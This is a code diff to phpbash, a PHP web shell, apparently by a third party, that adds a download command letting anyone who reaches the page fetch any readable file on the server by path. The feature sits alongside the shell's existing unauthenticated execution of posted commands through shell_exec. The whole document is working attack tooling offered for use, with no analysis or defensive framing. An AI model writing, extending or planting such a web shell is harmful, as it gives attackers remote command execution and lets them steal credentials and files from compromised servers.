@@ -1,5 +1,31 @@
 <?php
 /* phpbash by Alexander Reid (Arrexel) */
+/* Modified with download feature by b4ndit23 */
+
+if (ISSET($_GET['download']) && ISSET($_GET['path'])) {
+    $filepath = $_GET['path'];
+    $filename = basename($filepath);
+    
+    if (file_exists($filepath) && is_readable($filepath)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . $filename . '"');
+        header('Content-Length: ' . filesize($filepath));
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        
+        ob_clean();
+        flush();
+        
+        readfile($filepath);
+        exit;
+    } else {
+        header("HTTP/1.0 404 Not Found");
+        echo "File not found or not readable";
+        exit;
+    }
+}
+
 if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
     foreach ($output as $line) {
@@ -23,7 +49,7 @@ if (ISSET($_POST['cmd'])) {
 
 <html>
     <head>
-        <title></title>
+        <title>phpbash</title>
         <style>
             html, body {
                 max-width: 100%;
@@ -194,6 +220,13 @@ if (ISSET($_POST['cmd'])) {
                 } else if (parsedCommand[0] == "upload") {
                     fileBrowserElement.click();
                     return false;
+                } else if (parsedCommand[0] == "download") {
+                    if (parsedCommand.length < 2) {
+                        outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>Usage: download &lt;filename&gt;<br>";
+                        return false;
+                    }
+                    downloadFile(parsedCommand.slice(1).join(" "), originalCommand, originalDir);
+                    return false;
                 } else {
                     command = "cd "+currentDir+"; " + command;
                 }
@@ -220,6 +253,54 @@ if (ISSET($_POST['cmd'])) {
                 return false;
             }
             
+            function downloadFile(filename, originalCommand, originalDir) {      
+                var filepath;
+                if (filename.startsWith('/')) {
+                    filepath = filename;
+                } else {
+                    filepath = currentDir;
+                    if (currentDir != "/") {
+                        filepath += "/";
+                    }
+                    filepath += filename;
+                }
+                
+                var checkRequest = new XMLHttpRequest();
+                
+                checkRequest.onreadystatechange = function() {
+                    if (checkRequest.readyState == XMLHttpRequest.DONE) {
+                        var response = checkRequest.responseText.trim();
+                        
+                        response = response.replace(/<br>/g, '');
+                        
+                        if (response === "OK") {
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>Downloading "+htmlentities(filename)+"...<br>";
+                            
+                            var downloadUrl = "?download=1&path=" + encodeURIComponent(filepath);
+                            var link = document.createElement('a');
+                            link.href = downloadUrl;
+                            link.download = filename.split('/').pop(); 
+                            document.body.appendChild(link);
+                            link.click();
+                            document.body.removeChild(link);
+                            
+                            setTimeout(function() {
+                                outputElement.innerHTML += "Download started for "+htmlentities(filename)+"<br>";
+                                outputElement.scrollTop = outputElement.scrollHeight;
+                            }, 100);
+                        } else {
+                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>Error: File not found or not readable: "+htmlentities(filename)+"<br>";
+                            outputElement.scrollTop = outputElement.scrollHeight;
+                        }
+                    }
+                };
+                
+                var checkCommand = "[ -f '"+filepath.replace(/'/g, "'\\''")+"' ] && [ -r '"+filepath.replace(/'/g, "'\\''")+"' ] && echo 'OK' || echo 'FAIL'";
+                checkRequest.open("POST", "", true);
+                checkRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                checkRequest.send("cmd="+encodeURIComponent(checkCommand));
+            }
+            
             function uploadFile() {
                 var formData = new FormData();
                 formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
@@ -240,6 +321,10 @@ if (ISSET($_POST['cmd'])) {
             
             function updateInputWidth() {
                 inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
+            }
+            
+            function htmlentities(str) {
+                return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
             }
             
             document.onkeydown = checkForArrowKeys;
@@ -283,3 +368,5 @@ if (ISSET($_POST['cmd'])) {
         </script>
     </body>
 </html>
+
+
